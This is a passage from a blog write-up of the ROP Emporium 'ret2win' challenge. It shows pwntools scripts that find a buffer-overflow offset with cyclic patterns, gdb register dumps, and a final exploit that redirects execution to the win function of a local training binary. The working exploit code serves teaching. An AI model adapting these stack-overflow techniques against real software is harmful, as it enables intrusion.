2021-03-22-ropemporium-ret2win.html

<div id="outline-container-org5017396" class="outline-4">
<h4 id="org5017396"><span class="section-number-4">3.1.1</span> Cyclic patterns</h4>
<div class="outline-text-4" id="text-3-1-1">
<p>
Using cyclic patterns, we can relatively easy find the padding length of our payload.<br>
</p>

<div class="org-src-container">
<pre class="src src-python">from pwn import *

context.update(arch="amd64", os="linux")
proc = process("./ret2win")
gdb.attach(proc, """
b pwnme""")

def send_recv(buffer: bytes):
    proc.recvuntil(b"&gt;")
    proc.sendline(buffer)
    return proc.recvline()

payload = cyclic(56)

send_recv(payload)
proc.interactive()
</pre>
</div>

<p>
Here I used the <code>cyclic</code> function, from pwntools, to generate a 56 character long <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">de Bruijn sequence</a>.<br>
Which we can use to find our padding length<br>
</p>

<p>
The above script also attaches gdb, so we can find the pattern in the registers and use that in our exploit.<br>
</p>
<pre class="example" id="org316eca6">
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb
$rbx   : 0x0000000000400780  →  &lt;__libc_csu_init+0&gt; push r15
$rcx   : 0x00007fc84be920f7  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007ffdaa836178  →  0x6161616c6161616b ("kaaalaaa"?)
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00007fc84bf645a3  →  0xf664d0000000000a
$rdi   : 0x00007fc84bf664d0  →  0x0000000000000000
$rip   : 0x0000000000400755  →  &lt;pwnme+109&gt; ret
$r8    : 0xb
$r9    : 0x00007fc84bfad070  →  &lt;_dl_fini+0&gt; endbr64
$r10   : 0xfffffffffffffb8b
$r11   : 0x246
$r12   : 0x00000000004005b0  →  &lt;_start+0&gt; xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
</pre>

<p>
And as you can see <code>$rbp</code> has some sort of weird string.<br>
If we use the function <code>cyclic_find</code> in conjunction with <code>cyclic</code> we can find the padding for the exploit.<br>
</p>

<div class="org-src-container">
<pre class="src src-python">from pwn import *

context.update(arch="amd64", os="linux")
proc = process("./ret2win")
gdb.attach(proc, """
b pwnme""")

def send_recv(buffer: bytes):
    proc.recvuntil(b"&gt;")
    proc.sendline(buffer)
    return proc.recvline()

payload = cyclic(cyclic_find(0x61616169))
payload += p64(0xdeadbeefcafebabe)

send_recv(payload)
proc.interactive()
</pre>
</div>
<p>
If we concentrate on the payload, we see that we first calculate our padding.<br>
After that we add <code>0xdeadbeecafebabe</code> to ensure that we indeed do have control over <code>$rbp</code>.<br>
</p>

<pre class="example" id="orge54475b">
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb
$rbx   : 0x0000000000400780  →  &lt;__libc_csu_init+0&gt; push r15
$rcx   : 0x00007fa3497a50f7  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffb9d3f2d0  →  0x0000000000000000
$rbp   : 0xdeadbeefcafebabe
$rsi   : 0x00007fa3498775a3  →  0x8794d0000000000a
$rdi   : 0x00007fa3498794d0  →  0x0000000000000000
$rip   : 0x000000000040060a  →  &lt;deregister_tm_clones+26&gt; or eax, 0x1058bf5d
$r8    : 0xb
$r9    : 0x00007fa3498c0070  →  &lt;_dl_fini+0&gt; endbr64
$r10   : 0xfffffffffffffb8b
$r11   : 0x246
$r12   : 0x00000000004005b0  →  &lt;_start+0&gt; xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
</pre>
<p>
And if I could point your attention to <code>$rbp</code>, you should see that we have indeed control over the base pointer.<br>
</p>
</div>
</div>
</div>

<div id="outline-container-org27a1a57" class="outline-3">
<h3 id="org27a1a57"><span class="section-number-3">3.2</span> Useful addresses</h3>
<div class="outline-text-3" id="text-3-2">
<p>
Since we already know which function we need to execute, and the binary doesn't have PIE enabled, I went ahead and grabbed the address from Binary Ninja.<br>
</p>
<table>


<colgroup>
<col  class="org-left">

<col  class="org-right">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Name</th>
<th scope="col" class="org-right">Address</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">ret2win</td>
<td class="org-right">0x400756</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-org9f7b6dd" class="outline-3">
<h3 id="org9f7b6dd"><span class="section-number-3">3.3</span> Final exploit</h3>
<div class="outline-text-3" id="text-3-3">
<p>
So know that we have control over the base pointer let's make it point towards <code>ret2win</code> and finish this challenge.<br>
</p>
<div class="org-src-container">
<pre class="src src-python">from pwn import *

context.update(arch="amd64", os="linux")
proc = process("./ret2win")

def send_recv(buffer: bytes):
    proc.recvuntil(b"&gt;")
    proc.sendline(buffer)
    return proc.recvline()


ret2win_addr = 0x400756


payload = cyclic(cyclic_find(0x6161616B))
payload += p64(ret2win_addr)

send_recv(payload)
proc.interactive()
</pre>
</div>
<p>
As you can see instead of <code>0xdeadbeefcafebabe</code> we just use <code>ret2win_addr</code>.<br>
And if we run the script:<br>
</p>
<pre class="example" id="org0ed587b">
┌────[~/ha/bi/ropemporium/ret2win on  master [?]
└─&gt;python exploit.py
[+] Starting local process './ret2win': pid 170719
[*] Switching to interactive mode
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 170719)
[*] Got EOF while sending in interactive
</pre>
</div>
</div>
</div>

<div id="outline-container-org96231b8" class="outline-2">
<h2 id="org96231b8"><span class="section-number-2">4</span> Conclusion</h2>
<div class="outline-text-2" id="text-4">
<p>
First of all thank you for reading my first proper write-up.<br>
I hope it won't be the last, as I want to publish a new post/write-up/whatever-you-call-it every other week.<br>
</p>

<p>
So what did we do here?<br>
We got a <i>very</i> basic introduction to buffer overflows and ROP, but hopefully enough to you hooked ;).<br>
We successfully overflowed a buffer which let us control the return address of the function.<br>
</p>

<p>
My next post will be about ROPemporium split, where we need to make use of so called ROPgadgets.<br>
</p>
</div>
</div>
</div>
<div id="postamble" class="status">
<div class="footer">
    <div id="copyright">
        <small>&copy; Copyright 2021, C3lphie</small>
    </div>
</div>
</div>
</body>
</html>
